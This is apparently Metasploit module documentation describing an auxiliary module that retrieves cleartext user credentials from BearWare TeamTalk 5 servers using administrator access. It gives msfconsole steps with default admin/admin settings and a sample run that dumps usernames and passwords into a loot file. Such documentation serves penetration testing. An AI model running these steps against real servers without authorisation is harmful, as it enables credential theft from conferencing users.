## Description

  This module retrieves user credentials from BearWare TeamTalk.

  Valid administrator credentials are required.

  Starting from version 5, TeamTalk allows users to login using a username and password combination. The username and password are stored on the server in clear text and can be retrieved remotely by any user with administrator privileges.


## Vulnerable Application

  [TeamTalk 5](http://www.bearware.dk/) is a freeware conferencing system which allows multiple users to participate in audio and video conversations. The TeamTalk install file includes both client and server application. A special client application is included with accessibility features for visually impaired.

  This module has been tested successfully on TeamTalk versions 5.2.2.4885 and 5.2.3.4893.

  The TeamTalk software is available on the [BearWare website](http://www.bearware.dk/) and on [GitHub](https://github.com/BearWare/TeamTalk5).


## Verification Steps

  1. Start `msfconsole`
  2. Do: `use auxiliary/gather/teamtalk_creds`
  3. Do: `set rhost <RHOST>`
  4. Do: `set rport <RPORT>` (default: `10333`)
  5. Do: `set username <USERNAME>` (default: `admin`)
  6. Do: `set password <PASSWORD>` (default: `admin`)
  7. Do: `run`
  8. You should get credentials


## Scenarios

  ```
  [*] 172.16.191.166:10333 - Found TeamTalk (protocol version 5.2)
  [+] 172.16.191.166:10333 - Authenticated successfully
  [+] 172.16.191.166:10333 - User is an administrator
  [*] 172.16.191.166:10333 - Found 5 users

  TeamTalk User Credentials
  =========================

   Username  Password                     Type
   --------  --------                     ----
   debbie    1234567890                   1
   murphy    934txs                       2
   quinn     ~!@#$%^&*()_+{}|:" <>?;',./  2
   sparks    password                     2
   stormy                                 1

  [+] 172.16.191.166:10333 - Credentials saved in: /root/.msf4/loot/20170724092809_default_172.16.191.166_teamtalk.user.cr_034806.txt
  [*] Auxiliary module execution completed
  ```

